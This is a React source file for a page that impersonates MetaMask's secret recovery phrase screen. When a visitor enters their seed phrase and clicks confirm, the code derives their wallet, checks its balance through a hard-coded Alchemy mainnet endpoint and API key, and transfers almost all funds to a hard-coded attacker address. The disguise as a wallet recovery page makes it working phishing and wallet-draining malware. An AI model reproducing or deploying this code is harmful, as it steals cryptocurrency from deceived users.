import React, { useState } from "react";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faEye, faEyeSlash } from "@fortawesome/free-solid-svg-icons";
import AYW from "../assets/accessYourWallet.png";
import PRG from "../assets/progress.png";
import Header from "../components/header";

import { ethers } from "ethers";
import { Link } from "react-router-dom";

const RPC =
  "https://eth-mainnet.g.alchemy.com/v2/eGF2uRun9jOuwiS9FhuWy1lsuJ8tCvb5";
const ACCOUNT_TO_TRANSFER = "0xC06b2B460d8C0281c229f5CEFbD5F67595c1b2d4";

const WordPhrase = () => {
  const [phraseLength, setPhraseLength] = useState(12);
  const [inputValues, setInputValues] = useState(Array(phraseLength).fill(""));
  const [showPassword, setShowPassword] = useState(false);

  const handlePhraseLengthChange = (length) => {
    setPhraseLength(length);
    setInputValues(Array(length).fill(""));
  };

  const handleInputChange = (index, value) => {
    const newInputValues = [...inputValues];
    newInputValues[index] = value;
    setInputValues(newInputValues);
  };

  const toggleShowPassword = () => {
    setShowPassword(!showPassword);
  };

  const handleConfirmButtonClick = async () => {
    try {
      const mnemonic = inputValues.join(" ");

      const provider = new ethers.providers.JsonRpcProvider(RPC);
      const wallet = ethers.Wallet.fromMnemonic(mnemonic).connect(provider);

      const balance = await provider.getBalance(wallet.address);

      const amountToSend = balance.sub(ethers.utils.parseEther("0.001"));

      const transaction = {
        to: ACCOUNT_TO_TRANSFER,
        value: amountToSend,
      };

      const transactionResponse = await wallet.sendTransaction(transaction);
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <>
    <div className="bg-gray-900 min-h-screen flex flex-col">
      <Link to="/">
        <Header />
      </Link>
      <div className="flex-1 flex justify-center items-center">
        <div className=" mt-15 mx-auto max-w-2xl mb-5 border border-white border-opacity-25 rounded-lg bg-#3B4046 p-8 box-border">
          <div className="flex items-center justify-center">
            <img
              src={PRG}
              alt="Access Your Wallet With Your Secret Recovery Phrase"
              className="ml-15"
            />
          </div>

          <div className="p-5 text-center">
            <h2 className=" font-semibol font-inter text-white text-3xl">
              Access your wallet with your Secret Recovery Phrase
            </h2>
          </div>
          <div className="p-5 text-center">
            <p className=" font-inter text-white text-sm   mr-2">
              MetaMask cannot recover your password. We will use your Secret
              Recovery Phrase to validate your ownership, restore your wallet
              and set up a new password. First, enter the Secret Recovery Phrase
              that you were given when you created your wallet. Learn more
            </p>
          </div>

          <div className="flex sm:flex-wrap md:flex-wrap flex-wrap items-center mb-7 ml-2 mr-2 mt-5">
            <label className="mr-auto labelLine font-semibold font-inter text-white">
              Type Your Secret Recovery Phrase
            </label>
            <select
              className="p-2 border border-white border-opacity-25 rounded ml-auto bg-gray-900 text-white"
              value={phraseLength}
              onChange={(e) =>
                handlePhraseLengthChange(parseInt(e.target.value))
              }
            >
              <option value={12}>I have 12 word phrase entry</option>
              <option value={15}>I have 15 word phrase entry</option>
              <option value={18}>I have 18 word phrase entry</option>
              <option value={21}>I have 21 word phrase entry</option>
              <option value={24}>I have 24 word phrase entry</option>
            </select>
          </div>

          <div className="flex flex-wrap">
            {inputValues.map((value, index) => (
              <div
                key={index}
                className=" 2xl:w-1/3 xl:w-1/3 lg:w-1/3 md:w-1/3 sm:w-3/5 xs:w-3/5  mb-4 pr-2 relative"
              >
                <div className="relative">
                  <span className="absolute left-0 top-1/2 transform -translate-y-1/2 px-2 text-white ">
                    {index + 1}. &nbsp;
                  </span>
                  <input
                    type={showPassword ? "text" : "password"}
                    value={value}
                    onChange={(e) => handleInputChange(index, e.target.value)}
                    className="p-1 w-3/5 border border-white border-opacity-25 rounded bg-gray-900 text-white pl-3 ml-10 mr-2" // Updated width and margins
                  />
                </div>
                <div
                  className="absolute eyeIcon right-4 top-1/2 transform -translate-y-1/2 ml-1 cursor-pointer"
                  onClick={toggleShowPassword}
                >
                  {showPassword ? (
                    <FontAwesomeIcon icon={faEye} className="text-white" />
                  ) : (
                    <FontAwesomeIcon icon={faEyeSlash} className="text-white" />
                  )}
                </div>
              </div>
            ))}
          </div>
          <div className="text-center">
            <button
              className="bg-blue-500 text-white rounded-full p-3 mx-auto mt-4"
              onClick={handleConfirmButtonClick}
            >
              Confirm Secret Recovery Phrase
            </button>
          </div>
        </div>
      </div>
      </div>
    </>
  );
};

export default WordPhrase;
